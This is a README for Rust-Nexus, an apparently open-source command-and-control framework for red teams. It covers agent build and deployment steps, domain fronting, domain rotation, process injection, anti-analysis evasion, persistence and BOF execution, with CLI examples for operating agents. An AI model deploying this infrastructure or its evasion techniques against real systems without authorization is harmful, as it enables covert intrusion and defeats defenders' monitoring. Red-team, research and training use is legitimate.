# Rust-Nexus: Enterprise C2 Framework

An advanced Command & Control framework built in Rust featuring enterprise-grade infrastructure automation, dynamic domain management, automated certificate provisioning, gRPC communication, and enhanced BOF/COFF execution capabilities.

## 🚀 Overview

Rust-Nexus combines traditional C2 capabilities with cutting-edge infrastructure automation to create a sophisticated, enterprise-ready framework that rivals commercial solutions.

### Core Framework Components

1. **🏗️ Infrastructure Management (`nexus-infra`)**: Automated DNS, certificates, and domain rotation
2. **🔧 Agent Framework (`nexus-agent`)**: Advanced execution with fiber techniques and BOF support
3. **🖥️ C2 Server (`nexus-server`)**: gRPC-based server with agent management
4. **📚 Common Library (`nexus-common`)**: Shared utilities and cryptographic functions

## ✨ Key Features

### 🌐 **Enterprise Infrastructure**
- ✅ **Cloudflare DNS Integration**: Automated subdomain creation and management
- ✅ **Let's Encrypt Automation**: DNS-01 challenge certificate provisioning
- ✅ **Origin Certificates**: Cloudflare origin certificate support with pinning
- ✅ **Domain Fronting**: Traffic disguised as legitimate CDN requests
- ✅ **Dynamic Domain Rotation**: Automated infrastructure changes for OPSEC

### 🔒 **Advanced Communication**
- ✅ **gRPC over mTLS**: Modern protocol with bidirectional streaming
- ✅ **Certificate Pinning**: Enhanced security with origin certificate validation
- ✅ **Connection Resilience**: Automatic failover and retry mechanisms
- ✅ **Traffic Obfuscation**: Legitimate-looking HTTPS patterns
- ✅ **Geographic Distribution**: Leverage Cloudflare's global network

### 🖥️ **Interactive Interfaces**
- ✅ **Web UI Dashboard**: Modern browser-based management interface
- ✅ **Real-time Updates**: WebSocket-powered live data and notifications
- ✅ **Session Management**: Comprehensive agent lifecycle and task tracking
- ✅ **Interactive Shell**: Live command execution with real-time output
- ✅ **File Management**: Drag-and-drop file transfers with progress monitoring
- ✅ **REST & gRPC APIs**: Complete programmatic access for automation

### ⚡ **Enhanced Execution**
- ✅ **BOF/COFF Support**: Windows Beacon Object File execution
- ✅ **Fiber Techniques**: Direct fiber execution and process hollowing
- ✅ **PE/COFF Parsing**: Complete COFF loader with API resolution
- ✅ **Memory Management**: Safe allocation with proper cleanup
- ✅ **Early Bird Injection**: Pre-process initialization techniques

### 🛡️ **Security & Stealth**
- ✅ **Anti-Analysis**: VM, debugger, and sandbox detection
- ✅ **Timing Evasion**: Jitter and randomization techniques
- ✅ **Certificate Validation**: Multi-layer TLS security
- ✅ **Operational Security**: Automated infrastructure rotation
- ✅ **Traffic Legitimacy**: CDN-fronted communications

## 🏗️ Enhanced Architecture

```
┌─────────────────────────┐    ┌─────────────────────────┐    ┌─────────────────────────┐
│    Infrastructure       │    │     gRPC/TLS Comms     │    │       Agents            │
│                         │    │                         │    │                         │
├─────────────────────────┤    ├─────────────────────────┤    ├─────────────────────────┤
│ • Cloudflare DNS API    │◄──►│ • Mutual TLS            │◄──►│ • BOF/COFF Execution   │
│ • Let's Encrypt ACME    │    │ • Domain Fronting       │    │ • Fiber Techniques      │
│ • Certificate Management│    │ • Certificate Pinning   │    │ • Advanced Injection    │
│ • Domain Rotation       │    │ • Connection Pooling    │    │ • Anti-Analysis         │
│ • Health Monitoring     │    │ • Streaming Tasks       │    │ • Persistence           │
└─────────────────────────┘    └─────────────────────────┘    └─────────────────────────┘
```

## 📁 Project Structure

```
rust-nexus/
├── nexus-infra/            # 🆕 Infrastructure management
│   ├── proto/
│   │   └── nexus.proto     # gRPC service definitions
│   └── src/
│       ├── cloudflare.rs   # Cloudflare DNS API client
│       ├── letsencrypt.rs  # Let's Encrypt ACME automation
│       ├── cert_manager.rs # Certificate and TLS management
│       ├── domain_manager.rs # Domain rotation and health monitoring
│       ├── grpc_client.rs  # Enhanced gRPC client
│       ├── grpc_server.rs  # gRPC server implementation
│       ├── bof_loader.rs   # BOF/COFF execution engine
│       └── config.rs       # Configuration management
├── nexus-webui/            # 🆕 Modern web interface
│   └── src/
│       ├── handlers.rs     # HTTP request handlers
│       ├── websocket.rs    # Real-time WebSocket support
│       ├── static_files.rs # Static asset serving
│       └── templates.rs    # UI template rendering
├── nexus-common/           # Shared libraries
│   └── src/
│       ├── crypto.rs       # AES-256-GCM + RSA encryption
│       ├── messages.rs     # Legacy TCP message types
│       ├── agent.rs        # Agent data structures
│       └── tasks.rs        # Task and result types
├── nexus-agent/            # Enhanced agent
│   └── src/
│       ├── agent.rs        # Core agent with gRPC support
│       ├── communication.rs # Multi-protocol communication
│       ├── execution.rs    # Enhanced task execution
│       ├── fiber_execution.rs # Windows fiber techniques
│       ├── bof_execution.rs # 🆕 BOF execution integration
│       ├── evasion.rs      # Anti-analysis techniques
│       ├── persistence.rs  # Persistence mechanisms
│       └── system.rs       # System information gathering
├── nexus-server/           # 🆕 gRPC C2 server
│   └── src/
│       ├── main.rs         # Server main with infrastructure
│       ├── handlers.rs     # gRPC service handlers
│       ├── agent_manager.rs # Agent lifecycle management
│       └── cli.rs          # Administrative interface
├── config/                 # 🆕 Configuration templates
│   ├── examples/           # Example configurations
│   └── production/         # Production templates
├── docs/                   # 🆕 Comprehensive documentation
│   ├── infrastructure/     # Infrastructure guides
│   ├── execution/          # Execution technique guides
│   ├── configuration/      # Setup and config guides
│   ├── api/               # API reference documentation
│   └── operations/        # Operational guides
└── scripts/               # Enhanced build and deployment
    ├── build.sh           # Cross-platform builds
    ├── deploy.sh          # Infrastructure deployment
    └── setup-cloudflare.sh # Cloudflare initial setup
```

## 🚀 Quick Start

> **📚 New to Rust-Nexus?** Check out our **[Complete Setup and Deployment Guide](docs/COMPLETE_SETUP_GUIDE.md)** for comprehensive step-by-step instructions from prerequisites to production deployment.

### Fast Track Setup

For experienced users, here's the essential setup:

### Prerequisites
- Rust 1.70+ with cargo
- Cloudflare account with API token
- Domain managed by Cloudflare
- Basic understanding of TLS/certificates

### 1. **Infrastructure Setup**

```bash
# Clone the repository
git clone https://github.com/cmndcntrlcyber/rust-nexus.git
cd rust-nexus

# Create configuration from template
cp nexus.toml.example nexus.toml

# Edit configuration with your Cloudflare details
nano nexus.toml  # Add your API token, zone ID, and domain
```

### 2. **Build Framework**

```bash
# Build all components
cargo build --release

# Or build specific components
cargo build --release --bin nexus-infra
cargo build --release --bin nexus-server

# Build Linux Agent
cargo build --release --bin nexus-agent --config ./config/agent-linux.toml

# Build Windows Agent
cargo build --release --bin nexus-agent --config ./config/agent-windows.toml

### 3. **Deploy Infrastructure**

```bash
# Initialize Cloudflare DNS and certificates
./target/release/nexus-infra setup --config nexus.toml

# Start the gRPC C2 server
./target/release/nexus-server --config nexus.toml

# Deploy agents to targets
./target/release/nexus-agent --config nexus.toml
```

> **⚠️ First Time Setup?** The quick start assumes familiarity with the framework. For detailed configuration, troubleshooting, and production deployment, see the **[Complete Setup Guide](docs/COMPLETE_SETUP_GUIDE.md)**.

## 🔧 Configuration

### Example Configuration (`nexus.toml`)

```toml
[cloudflare]
api_token = "your_cloudflare_api_token"
zone_id = "your_zone_id"
domain = "example.com"
proxy_enabled = true
ttl = 300

[letsencrypt]
contact_email = "admin@example.com"
challenge_type = "Dns01"
cert_renewal_days = 30
wildcard_enabled = true

[grpc_server]
bind_address = "0.0.0.0"
port = 443
mutual_tls = true
max_connections = 1000

[domains]
primary_domains = ["c2.example.com"]
rotation_interval = 24
max_subdomains = 10

[security]
additional_encryption = true
traffic_obfuscation = true
anti_analysis = { vm_detection = true, debugger_detection = true }
```

## 🎯 Advanced Usage

### **gRPC Communication**

```bash
# Register agent with gRPC server
./nexus-agent --grpc-endpoint https://c2.example.com:443

# Execute BOF with arguments
nexus-cli bof-execute agent-123 "whoami.obj" "go"

# Domain rotation
nexus-cli domain rotate --immediate
```

### **BOF Development & Execution**

```rust
use nexus_infra::{BOFLoader, BofArgument};

let loader = BOFLoader::new();
let bof_data = std::fs::read("custom.obj")?;
let loaded_bof = loader.load_bof(&bof_data)?;

let args = vec![
    BofArgument::string("target_system"),
    BofArgument::int32(1234),
];

let result = loader.execute_bof(&loaded_bof, "go", &args)?;
```

### **Dynamic Infrastructure**

```rust
use nexus_infra::{CloudflareManager, DomainManager};

// Create new C2 subdomain
let domain = domain_manager.create_new_domain().await?;
println!("New C2 endpoint: {}", domain.full_domain);

// Automatic certificate provisioning
let cert = cert_manager.request_certificate(&domain.full_domain, &[]).await?;
```

## 📊 Monitoring & Operations

### Health Monitoring
```bash
# Check infrastructure health
nexus-cli status --all

# Domain health check
nexus-cli domains health

# Certificate status
nexus-cli certificates status
```

### Operational Commands
```bash
# Rotate domains immediately
nexus-cli domains rotate --immediate

# Update all domains to new IP
nexus-cli domains update-ip 203.0.113.10

# Renew certificates
nexus-cli certificates renew --all
```

## 🔐 Security Features

### **Certificate Management**
- **Automated Provisioning**: Let's Encrypt DNS-01 challenges via Cloudflare
- **Origin Certificates**: Cloudflare origin certs for backend security
- **Certificate Pinning**: Multi-layer validation and pinning
- **Auto-Renewal**: Certificates renewed 30 days before expiration

### **Domain Fronting**
- **CDN Integration**: Traffic routed through Cloudflare's network
- **Host Header Manipulation**: Proper domain fronting implementation
- **Geographic Distribution**: Global edge location utilization
- **Traffic Legitimacy**: Indistinguishable from normal CDN traffic

### **Anti-Analysis**
- **Infrastructure Level**: Domain rotation defeats long-term analysis
- **Certificate Level**: Valid TLS certificates prevent SSL inspection
- **Application Level**: Enhanced VM/debugger/sandbox detection
- **Network Level**: Traffic patterns match legitimate services

## 🧪 Testing

```bash
# Run all tests
cargo test

# Test infrastructure components
cargo test -p nexus-infra

# Test BOF loading
cargo test -p nexus-infra bof_loader

# Integration tests
./scripts/test-integration.sh
```

## 📚 Documentation

### Infrastructure & Configuration
- **[Infrastructure Setup](docs/infrastructure/README.md)** - Complete infrastructure guide
- **[Cloudflare Integration](docs/infrastructure/cloudflare-setup.md)** - DNS API setup
- **[Certificate Management](docs/infrastructure/certificates.md)** - TLS and Let's Encrypt
- **[Production Deployment](docs/configuration/production-setup.md)** - Enterprise deployment

### Interactive Interfaces & Operations
- **[Interactive Server Management](docs/operations/interactive-server.md)** - CLI and server interaction
- **[Web UI User Guide](docs/operations/web-interface.md)** - Browser-based management interface
- **[Session Management Guide](docs/operations/session-management.md)** - Agent lifecycle and task tracking

### API & Development
- **[Interactive API Reference](docs/api/interactive-reference.md)** - Complete REST, gRPC, and CLI reference
- **[Real-time Interaction Guide](docs/api/real-time-api.md)** - WebSocket and live updates
- **[BOF Development](docs/execution/bof-guide.md)** - BOF creation and execution

## 🎯 Use Cases

### **Red Team Operations**
- **Stealth C2**: Domain fronting defeats network monitoring
- **Infrastructure Agility**: Rapid domain rotation for persistence
- **Advanced Payloads**: BOF support for sophisticated techniques
- **Enterprise Evasion**: Multi-layer anti-analysis capabilities

### **Security Research**
- **Technique Development**: Framework for researching new methods
- **Tool Integration**: BOF ecosystem compatibility
- **Protocol Research**: gRPC-based C2 communication studies
- **Infrastructure Automation**: Research operational automation

### **Training & Education**
- **C2 Architecture**: Modern framework design patterns
- **Infrastructure Automation**: Cloud-native deployment techniques
- **Certificate Management**: Automated PKI operations
- **Advanced Execution**: Windows internals and injection methods

## 🛠️ Development

### Building from Source
```bash
# Development build with debug symbols
cargo build

# Optimized release build
cargo build --release --all

# Cross-compilation for Windows
cargo build --release --target x86_64-pc-windows-gnu

# Build with specific features
cargo build --features "enterprise,monitoring"
```

### Contributing
1. Fork the repository
2. Create feature branch (`git checkout -b feature/enhancement`)
3. Run tests (`cargo test`)
4. Submit pull request with comprehensive description

## 🔍 Troubleshooting

### Known Issues & Solutions

**❌ gRPC Compilation Errors: "failed to resolve use of unresolved module 'proto'"**

This indicates a namespace issue with protobuf-generated code that was resolved in the latest version.

```bash
# Quick diagnosis
cargo build -p nexus-infra 2>&1 | grep -E "(proto|nexus_c2_server|nexus_c2_client)"

# If you see namespace errors, the fix has been documented
# See: docs/troubleshooting/GRPC_NAMESPACE_FIX.md
```

**✅ Solution**: The namespace fix has been applied to ensure:
- Clean builds with only warnings (no compilation errors)
- Successful agent-server gRPC communication
- Working task management and file operations
- Cross-platform builds (Linux and Windows targets)

**Reference**: [Complete gRPC Namespace Fix Guide](docs/troubleshooting/GRPC_NAMESPACE_FIX.md)

### Common Issues

**❌ Cloudflare API Connection Failed**
```bash
# Verify API token permissions
curl -H "Authorization: Bearer YOUR_TOKEN" \
     "https://api.cloudflare.com/client/v4/user/tokens/verify"

# Check zone access
nexus-cli cloudflare verify --zone-id YOUR_ZONE_ID
```

**❌ Certificate Provisioning Failed**
```bash
# Check DNS propagation
dig TXT _acme-challenge.your-domain.com

# Manual certificate request
nexus-cli certificates request your-domain.com --force
```

**❌ gRPC Connection Issues**
```bash
# Test TLS connection
openssl s_client -connect your-domain.com:443 -servername your-domain.com

# Debug gRPC communication
RUST_LOG=debug ./target/release/nexus-agent --config agent.toml
```

### Performance Tuning
- **Connection Pools**: Adjust `max_connections` for load
- **Domain Health**: Configure `health_monitoring` intervals
- **Certificate Cache**: Tune renewal thresholds
- **Task Queues**: Optimize task distribution patterns

## 📈 Performance & Scale

### **Benchmarks**
- **Agent Connections**: 1000+ concurrent agents per server
- **Domain Rotation**: Sub-second DNS propagation via Cloudflare
- **Certificate Provisioning**: <60 seconds for new certificates
- **BOF Execution**: Minimal overhead compared to shellcode injection

### **Scalability Features**
- **Horizontal Scaling**: Multiple server instances with load balancing
- **Geographic Distribution**: Regional server deployment
- **Connection Pooling**: Efficient resource utilization
- **Lazy Initialization**: On-demand resource allocation

## 🎖️ Enterprise Features

### **Compliance & Monitoring**
- **Audit Logging**: Comprehensive operation logging
- **Certificate Lifecycle**: Automated compliance tracking
- **Infrastructure Changes**: Detailed change management
- **Agent Activity**: Real-time monitoring dashboards

### **High Availability**
- **Multi-Region**: Deploy across multiple cloud regions
- **Failover**: Automatic failover between domains/servers
- **Health Monitoring**: Continuous infrastructure health checks
- **Disaster Recovery**: Automated backup and restore procedures

## ⚠️ Security Notice

This framework is designed for **authorized security testing and research purposes only**. Users must:

- Ensure compliance with applicable laws and regulations
- Obtain proper authorization before deployment
- Use responsibly and ethically
- Respect system and network boundaries
- Follow responsible disclosure practices

**The authors are not responsible for misuse of this software.**

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🙏 Acknowledgments

- **Rust Community**: Exceptional tooling and ecosystem
- **Cloudflare**: Robust API and global infrastructure
- **Let's Encrypt**: Free, automated certificate authority
- **Sliver Framework**: Inspiration for gRPC architecture
- **BOF Community**: Windows internals research and techniques
- **Maldev Academy**: Fiber execution and evasion techniques

---

## 🚀 Getting Started

Ready to deploy? Start with our **[Complete Setup and Deployment Guide](docs/COMPLETE_SETUP_GUIDE.md)** for comprehensive step-by-step instructions from prerequisites to production.

### Additional Resources

- **[Infrastructure Setup Guide](docs/infrastructure/README.md)** - Deep dive into infrastructure automation
- **[BOF Development Guide](docs/execution/bof-guide.md)** - Advanced payload development
- **[Enterprise Setup Guide](docs/configuration/production-setup.md)** - Production deployment considerations

---

**Built with ❤️ in Rust | Enterprise-Ready | Research-Focused | Security-First**
